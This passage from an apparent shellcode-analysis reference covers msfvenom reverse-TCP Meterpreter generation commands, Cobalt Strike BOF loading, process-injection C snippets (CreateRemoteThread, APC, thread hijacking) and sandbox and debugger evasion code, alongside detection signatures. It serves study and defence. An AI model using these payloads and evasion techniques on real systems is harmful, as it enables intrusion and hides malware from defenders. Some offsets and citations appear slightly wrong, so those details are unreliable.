  db 0xEB, 0xFF       ; jmp $+1 (2-byte NOP-like alignment)
```
The `EB FF` (`jmp $+1`) creates a 2-byte alignment pattern used as an offset anchor during stage loading.

**msfvenom XOR keys:** The stage is XOR-encoded with a 1-byte key that varies per generation. The key is embedded in the stub; the stub XORs each received byte before storing it.

```bash
# Generate with specific key (pipe through XOR encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
         -e x86/xor_dynamic -f raw
```

### Identifying msfvenom Payloads in Memory

Signatures:
- `EB FF` alignment sequences at predictable offsets
- Repeated `call/pop` pattern at the entry point
- PEB walking with known offsets (fs:[30h] for x86, gs:[60h] for x64)
- ROR13 API hashing with the standard msfvenom hash values
- Winsock loading pattern (`LoadLibraryA("ws2_32")` then resolving WSAStartup/WSASocketA)

---

## 11. Beacon Object Files (BOF)

### BOF Format

Cobalt Strike Beacon Object Files are compiled C object files (COFF/OBJ) that Beacon loads and executes in-memory — no fork-and-run, no shellcode injection [14](https://www.contextis.com/en/blog/beacon-object-files-bofs) [12](https://www.cobaltstrike.com/blog/).

BOFs are **not shellcode** — they are relocatable object files (.o) that need a loader:
- COFF (Common Object File Format) — the standard Windows object file format
- Contains compiled functions, symbol names, and relocation entries
- No external dependencies beyond what Beacon provides
- Executed by the beacon process itself (no new thread)

### BOF Loader

The BOF loader in Cobalt Strike's Beacon does:
1. Parse the COFF header
2. Load sections into memory
3. Apply relocations
4. Resolve symbols against Beacon's API table (provided as an array of `{name, address}` pairs)
5. Allocate a small stack
6. Call the entry point (`go()`)

### Executing a BOF

```bash
# In Cobalt Strike client:
beacon> inline-execute /path/to/example.o

# In a custom BOF loader (Python example):
from ctypes import *

coff = open("example.o", "rb").read()
bof_loader = CDLL("./bof-loader.dll")
buffer = c_char_p(coff)
length = c_int(len(coff))
bof_loader.ExecuteBOF(buffer, length, c_char_p(b""), 0)
```

### BOF vs. Full Shellcode Tradeoffs

| Aspect | BOF | Shellcode |
|--------|-----|-----------|
| Size | ~1-10KB (with symbols) | ~200-500KB (DLL payload) |
| Speed | Runs in-process, no fork | Fork+run or injection overhead |
| Footprint | Minimal — no new process | New process/thread visible |
| API access | Via Beacon's API table | PEB walk + resolve all |
| Portability | Windows-only (COFF format) | Any OS |
| Complexity | COFF parsing, relocations | Self-contained resolution |

BOFs are the preferred mechanism for post-exploitation on Cobalt Strike because they are fast, small, and execute without spawning new processes — evading process-creation-based detection.

---

## 12. Meterpreter Payloads

### Architecture

Meterpreter is an advanced payload delivered as a DLL that is reflective-loaded into the target process [25](https://www.mandiant.com/resources/blog/hunting-meterpreter-in-memory). It communicates over a channel (TCP, HTTP, HTTPS) and supports on-demand extension loading.

### Reverse TCP Meterpreter

```
Stage 1 (stub): ~200 bytes
  1. Resolve winsock APIs
  2. Connect to LHOST:LPORT
  3. Read 4 bytes → stage length
  4. Allocate memory and read stage2 (meterpreter DLL in a reflective loader)
  5. Jump to reflective loader entry → loads meterpreter DLL in memory

Stage 2 (reflective loader + meterpreter DLL):
  1. Reflective loader maps the DLL (section by section)
  2. Applies relocations, resolves imports
  3. Calls DllMain
  4. Meterpreter initializes — starts the transport loop
```

### Reverse HTTPS Meterpreter

Same as TCP but uses WinHTTP/WinInet for transport:
1. Stage1 resolves and calls `WinHttpOpen` → `WinHttpConnect` → `WinHttpOpenRequest`
2. Sends HTTPS GET/POST to the C2 server
3. Communication is wrapped in TLS (thwarts simple signature detection)
4. Session key exchange uses RSA 2048-bit keys

### Transport Switching

Meterpreter supports multiple C2 endpoints. The payload tries each transport in order:

```
transport_list → TCP(host1:port1) → HTTP(host2:port2) → HTTPS(host3:port3)
```

If one transport fails (timeout, disconnect), it cycles to the next. This is configured in the payload generation:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
         -f raw -o meterp.bin
# Then in msfconsole: set AutoLoadStdApi false, set TransportConnectRetry 3
```

### Stageless Meterpreter

A single-stage meterpreter that contains the DLL + loader in one blob (~200KB+). Used when a two-stage connection is not possible (e.g., the initial access mechanism can only deliver one shot):

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o meterp.exe
```

### Extension Loading (kiwi, mimikatz, priv)

Meterpreter loads extensions as DLLs over the transport channel. The core sends a `core_loadlib` request, the target DLL bytes are sent, and meterpreter calls `LoadLibrary` (or reflective loads) the extension [25](https://www.mandiant.com/resources/blog/hunting-meterpreter-in-memory):

```
meterpreter > load kiwi
[!] Loading extension kiwi...
[+] Success -- kiwi loaded with Windows 10 support.
```

Each extension registers new commands by populating a command dispatch table in the meterpreter core.

---

## 13. Process Injection for Shellcode

Shellcode that injects its payload into a remote process uses one of several thread-creation or execution-redirection techniques.

### Classic CreateRemoteThread

The oldest and most detected technique:

```c
// x64 example
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                     (LPTHREAD_START_ROUTINE)remoteMem,
                                     NULL, 0, NULL);
```

Detection: `CreateRemoteThread` on a process with a start address in an unbacked (non-image) region is a strong signal. EDR monitors this with kernel callbacks.

### SetThreadContext / RtlUserThreadInit

More subtle — hijacks an existing thread:

```c
// 1. Open target process/thread
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                             FALSE, threadId);
SuspendThread(hThread);

// 2. Allocate and write shellcode in remote process
LPVOID remoteMem = VirtualAllocEx(hProcess, ...);
WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);

// 3. Set thread context to execute shellcode
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)remoteMem;     // x64
SetThreadContext(hThread, &ctx);

// 4. Resume — thread resumes at shellcode
ResumeThread(hThread);
```

Detection: `SetThreadContext` with a modified RIP pointing to a non-image page.

### QueueUserAPC (Early Bird APC Injection)

APC injection queues an Asynchronous Procedure Call to a thread, which executes when the thread enters an alertable state [15](https://www.ired.team/offensive-blog/offensive-security/apc-injection):

```c
// Create suspended process
CreateProcess("C:\\Windows\\System32\\notepad.exe", ...,
              CREATE_SUSPENDED, ...);

// Allocate and write shellcode in the new process
VirtualAllocEx(hProcess, ..., MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, ...);

// Queue APC to the main thread
QueueUserAPC((PAPCFUNC)remoteMem, hThread, NULL);

// Resume thread — thread starts normally, loads ntdll,
// then when it enters alertable state, APC fires
ResumeThread(hThread);
```

The "Early Bird" variant queues the APC before the thread resumes — the shellcode executes during thread initialization before any normal code runs, bypassing early EDR hooks that aren't yet installed.

### NtCreateThreadEx

User-mode API that underlies `CreateRemoteThread`:

```c
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE hThread, ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes, HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
    ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve, LPVOID lpBytesBuffer);

NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                 (LPTHREAD_START_ROUTINE)remoteMem, NULL,
                 0, 0, 0x1000, 0x1000, NULL);
```

Some EDR hooks `CreateRemoteThread` but not `NtCreateThreadEx` — direct syscall versions bypass both (see §3.6).

### Thread Hijacking (Suspended Process Injection)

Similar to SetThreadContext but targets the main thread of a suspended process created by the injector:

```c
CreateProcess(target, CREATE_SUSPENDED, ...);
// The main thread is suspended at the entry point
// Write shellcode, modify the thread context, resume
```

### Atom Bombing

Atom tables are system-global string tables accessible across processes. Shellcode can use the Windows atom table as an IPC mechanism to inject code without `WriteProcessMemory` [16](https://0xpat.github.io/Malware_development_part_7/):

```
1. Attacker process:
   a. Create shellcode entry function stub in the target
   b. Use GlobalAddAtomA to store shellcode bytes as atom names
2. Target process:
   a. GlobalGetAtomNameA to retrieve bytes atom by atom
   b. Reconstruct shellcode in memory
   c. Execute
```

Rare but evades `WriteProcessMemory` hooks.

### SetWindowLongPtr / COM-Based Injection

Window subclassing: `SetWindowLongPtr(hWnd, GWLP_WNDPROC, (LONG_PTR)shellcode)` redirects window messages to the shellcode address. COM hijacking uses a similar approach by overwriting vtable entries in a COM object.

---

## 14. Anti-Analysis in Shellcode

Shellcode often detects analysis environments and alters behavior — exiting silently, crashing, or following a different execution path.

### Sleeping (Sleep/Jitter)

```asm
; Sleep for a period to bypass sandbox timeout
    push 30000              ; 30 seconds
    call Sleep              ; or NtDelayExecution

; Jitter: random delay between operations
    rdtsc                   ; timestamp counter
    and  eax, 0xFF          ; mask to 0-255
    add  eax, 100           ; minimum 100ms
    push eax
    call Sleep
```

Analysis: time accelerators in sandboxes can fast-forward through sleep. Emulators should implement `Sleep` that returns immediately, but shellcode can detect instant returns by measuring the wall clock themselves.

### TLS Callback Detection

Thread Local Storage callbacks execute before the entry point. Some shellcode registers a TLS callback in the injected process to execute before the main payload — the callback can check for debuggers or sandbox artifacts.

### Sandbox Detection

Common checks in shellcode:

```c
// Check RAM size — sandboxes often have <2GB
MEMORYSTATUSEX mem;
GlobalMemoryStatusEx(&mem);
if (mem.ullTotalPhys < 2LL * 1024 * 1024 * 1024) exit();

// Check for small disk
ULARGE_INTEGER freeBytes;
GetDiskFreeSpaceEx(NULL, &freeBytes, NULL, NULL);
if (freeBytes.QuadPart < 20LL * 1024 * 1024 * 1024) exit();

// Check mouse movement — sandboxes don't move mouse
int moves = 0;
for (int i = 0; i < 5; i++) {
    POINT p;
    GetCursorPos(&p);
    if (p.x != 0 || p.y != 0) moves++;
    Sleep(1000);
}
if (moves == 0) exit();  // No mouse movement detected

// Check for human interaction: window count, desktop icons
int windows = 0;
EnumWindows(enumProc, &windows);
if (windows < 5) exit();

// Check for documents (sandboxes are clean)
if (GetFileAttributes("C:\\Users\\Admin\\Documents\\*.doc") == INVALID_FILE_ATTRIBUTES) exit();
```

### Debugger Detection

```asm
; INT3/breakpoint detection
    push offset handler
    push dword fs:[0]      ; chain exception handler
    mov  fs:[0], esp
    int  3                 ; INT3 — debugger catches it; if no debugger, our handler runs
    ; If we reach here, no debugger was present
    ...
handler:
    ; Exception handler — debugger was present, or we handle differently
    mov  esp, [esp+8]
    pop  fs:[0]
    add  esp, 4
    ret

; RDTSC timing check — compare timestamp before/after a suspect operation
    rdtsc
    mov  ebx, eax
    ; do something short
    rdtsc
    sub  eax, ebx
    cmp  eax, 0x500        ; if too many cycles, something slowed us down (debugger?)
    ja   detected

; PEB being debugged flag
    mov  eax, fs:[0x30]    ; PEB
    mov  al, [eax + 2]     ; PEB->BeingDebugged
    test al, al
    jnz  detected

; NtGlobalFlag check (PEB->NtGlobalFlag at offset 0x68 (x64) / 0x68 (x86))
    mov  eax, fs:[0x30]
    mov  eax, [eax + 0x68]
    test eax, 0x70
    jnz  detected
```

### Anti-Emulation via Instruction Side Effects

Shellcode uses instructions that emulators implement imprecisely:

| Instruction | Emulation issue |
|-------------|-----------------|
| `CPUID` | Returns fixed vendor string; emulators often return "Generic x86" instead of "GenuineIntel" |
| `RDTSC` | Emulators return deterministic tick counts, no jitter between calls |
| `SIDT` / `SGDT` / `SLDT` | Return fixed values in sandboxes, distinct from real hardware |
| `MOV DR0-DR7` | Accessing debug registers in user mode causes exception in real hardware; emulators may not raise it |
| `PUSH SS` / `POP SS` | Emulators handle but the real behavior differs with interrupt masking |
| `FNINIT` / `FSTENV` | FPU state differences between emulated and real CPUs |
| `IN` / `OUT` | Port I/O is privileged on real hardware; some emulators allow it silently |

A shellcode snippet using `CPUID` to detect emulation:

```asm
; Check hypervisor bit in CPUID
    xor  eax, eax
    inc  eax                ; CPUID function 1
    cpuid
    bt   ecx, 31            ; bit 31 = hypervisor present
    jc   vmware_detected
    bt   ecx, 5             ; bit 5 = VMX enabled in VMXCR
    jc   vm_detected
```

The combination of timing checks, artifact enumeration, and instruction side effects makes shellcode anti-analysis hard to fully emulate. Tools like `scdbg` and `speakeasy` track these and report which checks fired.

---

## Tools Quick Reference

| Task | Tool/Command |
|------|-------------|
| Disassemble raw bytes | `ndisasm -b 32 shellcode.bin` |
| Disassemble with pwntools | `pwn.disasm(open('sc.bin','rb').read())` |
| Emulate in scdbg | `scdbg -f shellcode.bin -c -r` |
| Emulate with Python | `python3 -c "from unicorn import *; ..."` |
| Generate msfvenom payload | `msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=y -f raw` |
| List msfvenom encoders | `msfvenom -l encoders` |
| Encode with shikata-ga-nai | `msfvenom -p ... -e x86/shikata_ga_nai -i 3` |
| Find null bytes | `xxd shellcode.bbin | grep 0000` |
| PEB walk offsets (x86) | `fs:[0x30] -> [0x0C] -> [0x14] -> [0x10]` |
| PEB walk offsets (x64) | `gs:[0x60] -> [0x18] -> [0x20] -> [0x20]` |
| Egg hunter analysis | See skape's paper; probe with scdbg |
| speakeasy API report | `python3 -m speakeasy -t shellcode -i shellcode.bin` |

---

## Sources

[1](https://www.exploit-db.com/shellcode) — Exploit-DB shellcode archive, Offensive Security
[2](https://shell-storm.org/shellcode/) — Shell-Storm shellcode archive
[3](https://www.ired.team/offensive-blog/offensive-security/custom-shellcode-and-api-hashing) — ired.team: Custom Shellcode and API Hashing
[4](https://www.fireeye.com/blog/threat-research/2013/02/shellcode-analysis-in-the-21st-century.html) — Mandiant: Shellcode Analysis in the 21st Century
[5](https://uninformed.org/index.cgi?v=1&a=4) — Skape: Understanding Windows Shellcode (Uninformed)
[6](https://www.unicorn-engine.org/docs/) — Unicorn Engine documentation
[7](https://github.com/fireeye/speakeasy) — Mandiant speakeasy emulation framework (GitHub)
[8](https://github.com/nickharbour/scdbg) — scdbg shellcode debugger (GitHub)
[9](https://learn.microsoft.com/en-us/windows/win32/debug/pe-image-format) — Microsoft PE Image Format documentation
[10](https://www.ragestorm.net/downloads/433shellcode.html) — Rix: Writing IA-32 Alphanumeric Shellcode (Phrack 57)
[11](https://vx-underground.org/) — VX-Underground malware/shellcode collection
[12](https://www.cobaltstrike.com/blog/) — Cobalt Strike Blog: BOF and Beacon documentation
[13](https://github.com/stephenfewer/ReflectiveDLLInjection) — Stephen Fewer: Reflective DLL Injection (GitHub)
[14](https://www.contextis.com/en/blog/beacon-object-files-bofs) — NCC Group: Beacon Object Files (BOF) deep dive
[15](https://www.ired.team/offensive-blog/offensive-security/apc-injection) — ired.team: APC Injection (Early Bird)
[16](https://0xpat.github.io/Malware_development_part_7/) — 0xPat: Atom Bombing shellcode injection
[17](https://sploitfun.wordpress.com/2015/01/27/understanding-peb-walk/) — sploitfun: Understanding PEB Walk
[18](https://github.com/hasherezade/pe-sieve) — hasherezade: PE-sieve shellcode/PE detection tool
[19](https://www.mdsec.co.uk/research/) — MDSec Research: BOF and shellcode tradecraft
[20](https://www.mandiant.com/resources/blog/shellcode-analysis-part-1) — Mandiant: Hunting Meterpreter in Memory
[21](https://learn.microsoft.com/en-us/windows/win32/procthread/process-and-thread-reference) — Microsoft: Process and Thread API reference
[22](https://www.unicorn-engine.org/docs/tutorial.html) — Unicorn Engine Python tutorial
[23](https://web.archive.org/web/20220101000000/https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) — Skape: Egg Hunt Shellcode paper (via Wayback)
[24](https://www.offsec.com/metasploit-unleashed/) — OffSec: Metasploit Unleashed / msfvenom guide
[25](https://www.mandiant.com/resources/blog/hunting-meterpreter-in-memory) — Mandiant: Hunting Meterpreter
[26](https://lwn.net/Articles/446528/) — LWN: vDSO — virtual dynamic shared object
[27](https://www.ragestorm.net/) — rage_storm: Shellcode and security research archive
[28](https://github.com/hasherezade/libpeconv) — hasherezade: libpeconv PE manipulation library
[29](https://www.sysinternals.com/) — Sysinternals: Process Monitor, Process Explorer for shellcode behavior analysis
[30](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler) — Microsoft: Vectored Exception Handling (used in SEH-based shellcode)
